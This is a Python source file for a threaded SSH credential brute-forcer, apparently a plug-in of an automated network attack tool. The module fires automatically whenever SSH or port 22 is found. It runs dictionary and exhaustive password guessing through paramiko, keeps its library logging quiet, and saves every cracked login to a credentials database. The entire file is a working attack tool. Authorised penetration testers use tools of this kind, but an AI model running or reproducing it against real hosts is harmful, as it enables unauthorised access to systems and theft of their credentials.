"""ssh_bruteforce.py - Threaded SSH credential bruteforcer via paramiko."""

import os
import paramiko
import socket
import threading
import logging
import time
import datetime

from queue import Queue
from shared import SharedData
from actions.bruteforce_common import ProgressTracker, merged_password_plan
from logger import Logger

logger = Logger(name="ssh_bruteforce.py", level=logging.DEBUG)

# Silence Paramiko internals
for _name in ("paramiko", "paramiko.transport", "paramiko.client", "paramiko.hostkeys",
              "paramiko.kex", "paramiko.auth_handler"):
    logging.getLogger(_name).setLevel(logging.CRITICAL)

b_class   = "SSHBruteforce"
b_module  = "ssh_bruteforce"
b_status  = "brute_force_ssh"
b_port    = 22
b_service = '["ssh"]'
b_trigger = 'on_any:["on_service:ssh","on_new_port:22"]'
b_parent  = None
b_priority = 70
b_cooldown = 1800            # 30 min between runs
b_rate_limit = '3/86400'     # max 3 per day
b_enabled = 1
b_action = "normal"
b_timeout = 600
b_max_retries = 2
b_stealth_level = 3
b_risk_level = "medium"
b_tags = ["bruteforce", "ssh", "credentials"]
b_category = "exploitation"
b_name = "SSH Bruteforce"
b_description = "Threaded SSH credential bruteforcer via paramiko with dictionary and exhaustive modes."
b_author = "Bjorn Team"
b_version = "2.0.0"
b_icon = "SSHBruteforce.png"


class SSHBruteforce:
    """Wrapper called by the orchestrator."""

    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ssh_bruteforce = SSHConnector(shared_data)
        logger.info("SSHConnector initialized.")

    def bruteforce_ssh(self, ip, port):
        """Run the SSH brute force attack on the given IP and port."""
        logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
        return self.ssh_bruteforce.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        """Execute the brute force attack and update status (for UI badge)."""
        logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
        self.shared_data.bjorn_orch_status = "SSHBruteforce"
        self.shared_data.comment_params = {"user": "?", "ip": ip, "port": port}

        success, results = self.bruteforce_ssh(ip, port)
        return 'success' if success else 'failed'


class SSHConnector:
    """Handles the connection attempts and DB persistence."""

    def __init__(self, shared_data):
        self.shared_data = shared_data

        # Load wordlists (unchanged behavior)
        self.users = self._read_lines(shared_data.users_file)
        self.passwords = self._read_lines(shared_data.passwords_file)

        # Build initial IP -> (MAC, hostname) cache from DB
        self._ip_to_identity = {}
        self._refresh_ip_identity_cache()

        self.lock = threading.Lock()
        self.results = []  # List of tuples (mac, ip, hostname, user, password, port)
        self.queue = Queue()
        self.progress = None

    # ---- Mapping helpers (DB) ------------------------------------------------

    def _refresh_ip_identity_cache(self):
        """Load IPs from DB and map them to (mac, current_hostname)."""
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []

        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str):
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str):
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # ---- File utils ----------------------------------------------------------

    @staticmethod
    def _read_lines(path: str):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.rstrip("\n\r") for l in f if l.strip()]
        except Exception as e:
            logger.error(f"Cannot read file {path}: {e}")
            return []

    # ---- SSH core ------------------------------------------------------------

    def ssh_connect(self, adresse_ip, user, password, port=b_port, timeout=10):
        """Attempt to connect to SSH using (user, password)."""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        timeout = float(getattr(self.shared_data, "ssh_connect_timeout_s", timeout))

        try:
            ssh.connect(
                hostname=adresse_ip,
                username=user,
                password=password,
                port=port,
                timeout=timeout,
                auth_timeout=timeout,
                banner_timeout=timeout,
                look_for_keys=False,  # avoid slow key probing
                allow_agent=False,    # avoid SSH agent delays
            )
            return True
        except (paramiko.AuthenticationException, socket.timeout, socket.error, paramiko.SSHException):
            return False
        except Exception as e:
            logger.debug(f"SSH connect unexpected error {adresse_ip} {user}: {e}")
            return False
        finally:
            try:
                ssh.close()
            except Exception:
                pass

    # ---- Robust DB upsert fallback ------------------------------------------

    def _fallback_upsert_cred(self, *, mac, ip, hostname, user, password, port, database=None):
        """
        Insert-or-update without relying on ON CONFLICT columns.
        Works even if your UNIQUE index uses expressions (e.g., COALESCE()).
        """
        mac_k = mac or ""
        ip_k = ip or ""
        user_k = user or ""
        db_k = database or ""
        port_k = int(port or 0)

        try:
            with self.shared_data.db.transaction(immediate=True):
                # 1) Insert if missing
                self.shared_data.db.execute(
                    """
                    INSERT OR IGNORE INTO creds(service,mac_address,ip,hostname,"user","password",port,"database",extra)
                    VALUES('ssh',?,?,?,?,?,?,?,NULL)
                    """,
                    (mac_k, ip_k, hostname or "", user_k, password or "", port_k, db_k),
                )
                # 2) Update password/hostname if present (or just inserted)
                self.shared_data.db.execute(
                    """
                    UPDATE creds
                       SET "password"=?,
                           hostname=COALESCE(?, hostname),
                           last_seen=CURRENT_TIMESTAMP
                     WHERE service='ssh'
                       AND COALESCE(mac_address,'')=?
                       AND COALESCE(ip,'')=?
                       AND COALESCE("user",'')=?
                       AND COALESCE(COALESCE("database",""),'')=?
                       AND COALESCE(port,0)=?
                    """,
                    (password or "", hostname or None, mac_k, ip_k, user_k, db_k, port_k),
                )
        except Exception as e:
            logger.error(f"fallback upsert_cred failed for {ip} {user}: {e}")

    # ---- Worker / Queue / Threads -------------------------------------------

    def worker(self, success_flag):
        """Worker thread to process items in the queue (bruteforce attempts)."""
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            try:
                if self.ssh_connect(adresse_ip, user, password, port=port):
                    with self.lock:
                        # Persist success into DB.creds
                        try:
                            self.shared_data.db.insert_cred(
                                service="ssh",
                                mac=mac_address,
                                ip=adresse_ip,
                                hostname=hostname,
                                user=user,
                                password=password,
                                port=port,
                                database=None,
                                extra=None
                            )
                        except Exception as e:
                            # Specific fix: fallback manual upsert
                            if "ON CONFLICT clause does not match" in str(e):
                                self._fallback_upsert_cred(
                                    mac=mac_address,
                                    ip=adresse_ip,
                                    hostname=hostname,
                                    user=user,
                                    password=password,
                                    port=port,
                                    database=None
                                )
                            else:
                                logger.error(f"insert_cred failed for {adresse_ip} {user}: {e}")

                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                        logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                        self.shared_data.comment_params = {"user": user, "ip": adresse_ip, "port": str(port)}
                        success_flag[0] = True

            finally:
                if self.progress is not None:
                    self.progress.advance(1)
                self.queue.task_done()

                # Optional delay between attempts
                if getattr(self.shared_data, "timewait_ssh", 0) > 0:
                    time.sleep(self.shared_data.timewait_ssh)



    def run_bruteforce(self, adresse_ip, port):
        """
        Called by the orchestrator with a single IP + port.
        Builds the queue (users x passwords) and launches threads.
        """
        self.results = []
        mac_address = self.mac_for_ip(adresse_ip)
        hostname = self.hostname_for_ip(adresse_ip) or ""

        dict_passwords, fallback_passwords = merged_password_plan(self.shared_data, self.passwords)
        total_tasks = len(self.users) * (len(dict_passwords) + len(fallback_passwords))
        if total_tasks == 0:
            logger.warning("No users/passwords loaded. Abort.")
            return False, []

        self.progress = ProgressTracker(self.shared_data, total_tasks)
        success_flag = [False]

        def run_phase(passwords):
            phase_tasks = len(self.users) * len(passwords)
            if phase_tasks == 0:
                return

            for user in self.users:
                for password in passwords:
                    if self.shared_data.orchestrator_should_exit:
                        logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                        return
                    self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

            threads = []
            thread_count = min(8, max(1, phase_tasks))
            for _ in range(thread_count):
                t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
                t.start()
                threads.append(t)

            # Drain queue if orchestrator exit is requested, to unblock join
            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    # Discard remaining items so workers can finish
                    while not self.queue.empty():
                        try:
                            self.queue.get_nowait()
                            self.queue.task_done()
                        except Exception:
                            break
                    break
                time.sleep(0.5)
            self.queue.join()
            for t in threads:
                t.join()

        try:
            run_phase(dict_passwords)
            if (not success_flag[0]) and fallback_passwords and not self.shared_data.orchestrator_should_exit:
                logger.info(
                    f"SSH dictionary phase failed on {adresse_ip}:{port}. "
                    f"Starting exhaustive fallback ({len(fallback_passwords)} passwords)."
                )
                run_phase(fallback_passwords)
            self.progress.set_complete()
            return success_flag[0], self.results
        finally:
            self.shared_data.bjorn_progress = ""


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("SSH brute force module ready.")
        exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)
